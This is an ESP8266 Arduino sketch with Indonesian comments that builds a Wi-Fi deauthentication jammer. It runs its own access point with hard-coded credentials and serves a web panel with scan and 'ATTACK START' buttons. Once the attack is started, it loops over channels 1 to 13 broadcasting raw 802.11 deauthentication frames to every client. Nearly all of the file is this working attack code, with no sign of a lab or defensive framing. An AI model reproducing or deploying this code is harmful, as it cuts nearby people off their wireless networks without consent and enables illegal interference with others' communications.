#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <FS.h> 
#include <Wire.h>
#include "SSD1306Wire.h" // Driver khusus untuk OLED Wemos Shield/0.66

// Inisialisasi Layar 64x48 (Alamat 0x3c, SDA=D2, SCL=D1)
SSD1306Wire display(0x3c, D2, D1, GEOMETRY_64_48);

extern "C" {
  void wifi_set_channel(uint8 channel);
  int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
}

const char* admin_ssid = "GMpro86";
const char* admin_pass = "sangkur87";

ESP8266WebServer server(80);
DNSServer dnsServer;
File fsUploadFile;
bool massDeauthActive = false;
String scanResultsHTML = "READY TO SCAN...";

void updateDisplay(String line1, String line2) {
  display.clear();
  display.setFont(ArialMT_Plain_10);
  display.setTextAlignment(TEXT_ALIGN_LEFT);
  display.drawString(0, 0, "GM-PRO86");
  display.drawString(0, 15, line1);
  display.drawString(0, 30, line2);
  display.display();
}

const char ADMIN_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  body{background:#000;color:#0f0;font-family:monospace;margin:0;padding-bottom:80px}
  .hdr{border-bottom:1px solid #0f0;padding:15px;text-align:center;font-weight:bold}
  .card{background:#111;margin:10px;padding:15px;border:1px solid #333;border-left:4px solid #0f0}
  .btn{border:1px solid #0f0;background:0;color:#0f0;padding:12px;width:100%;margin-top:10px;font-weight:bold;cursor:pointer}
  .btn-red{border-color:#f00;color:#f00}
</style></head><body>
<div class="hdr">COMMANDER V8.6</div>
<div class="card">
  <button class="btn btn-red" onclick="location.href='/mode?m=mass'">ATTACK START</button>
  <button class="btn" onclick="location.href='/mode?m=off'">STOP</button>
  <button class="btn" onclick="location.href='/scan'">SCAN</button>
</div>
<div class="card" style="font-size:10px">%WIFILIST%</div>
</body></html>
)rawliteral";

void setup() {
  SPIFFS.begin();
  pinMode(2, OUTPUT); 

  display.init();
  display.flipScreenVertically();
  updateDisplay("BOOTING", "SYSTEM OK");

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(admin_ssid, admin_pass);
  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/admin", [](){
    String s = ADMIN_HTML;
    s.replace("%WIFILIST%", scanResultsHTML);
    server.send(200, "text/html", s);
  });

  server.on("/scan", [](){
    int n = WiFi.scanNetworks();
    scanResultsHTML = "";
    for (int i = 0; i < n; ++i) {
      scanResultsHTML += "<div>" + WiFi.SSID(i) + "</div>";
    }
    server.sendHeader("Location", "/admin");
    server.send(303);
    updateDisplay("SCANNING", "DONE");
  });

  server.on("/mode", [](){
    massDeauthActive = (server.arg("m") == "mass");
    server.sendHeader("Location", "/admin");
    server.send(303);
  });

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  if (massDeauthActive) {
    updateDisplay("ATTACK", "ACTIVE");
    digitalWrite(2, !digitalRead(2));
    uint8_t pkt[26] = {0xc0,0,0x3a,0x01, 0xff,0xff,0xff,0xff,0xff,0xff, 0,0,0,0,0,0, 0,0,0,0,0,0, 0,0,1,0};
    for (int ch=1; ch<=13; ch++) {
      wifi_set_channel(ch);
      for (int i=0; i<15; i++) { wifi_send_pkt_freedom(pkt, 26, 0); delay(1); }
      yield();
    }
  } else {
    digitalWrite(2, HIGH);
    // Kita panggil updateDisplay jarang-jarang saja biar nggak kedip
    static long lastMsg = 0;
    if(millis() - lastMsg > 5000) {
      updateDisplay("IDLE", "READY");
      lastMsg = millis();
    }
  }
}
